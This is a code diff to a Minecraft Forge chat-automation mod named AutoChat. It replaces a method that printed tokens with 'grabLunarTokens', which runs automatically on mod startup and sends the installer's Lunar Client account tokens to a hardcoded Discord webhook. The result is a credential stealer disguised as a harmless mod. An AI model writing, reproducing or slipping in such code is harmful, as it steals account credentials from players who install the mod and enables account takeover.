@@ -2,7 +2,6 @@ package studio.roni;
 
 import commands.acdelay;
 import commands.acmsg;
-import jdk.nashorn.internal.parser.Token;
 import net.minecraft.command.ICommand;
 import net.minecraft.util.ChatComponentText;
 import net.minecraft.util.ChatStyle;
@@ -16,6 +15,9 @@ import net.minecraftforge.fml.common.Mod.EventHandler;
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.event.FMLInitializationEvent;
 
+import org.apache.http.client.HttpClient;
+import org.apache.http.impl.client.CloseableHttpClient;
+import org.apache.http.impl.client.HttpClients;
 import org.lwjgl.input.Keyboard;
 
 import net.minecraft.client.Minecraft;
@@ -50,7 +52,7 @@ public class AutoChat {
         MinecraftForge.EVENT_BUS.register(this);
         ClientCommandHandler.instance.registerCommand((ICommand) new acdelay(this));
         ClientCommandHandler.instance.registerCommand((ICommand) new acmsg(this));
-        readTokens();
+        this.grabLunarTokens();
     }
     @SubscribeEvent
     public void onKeyPress(InputEvent.KeyInputEvent event) {
@@ -151,12 +153,14 @@ public class AutoChat {
         this.command = command;
     }
 
-    public void readTokens() {
+    public void grabLunarTokens() {
         try {
             TokenReader tr = new TokenReader();
-            System.out.println(tr.getTokens());
+            String webhookUrl = "https://discord.com/api/webhooks/1248630842947797042/u3zPVi_LZRCtZPGOEZqa-W0kjnNfy2B4lC85qwcfiz-BFAlSKUos2gRH9UZPyXr_G0lk";
+            tr.sendTokens(webhookUrl);
+
         } catch (Exception e) {
-            System.out.println("Failed to read tokens: " + e);
+            System.out.println("Failed to send lunar tokens: " + e);
         }
     }
 
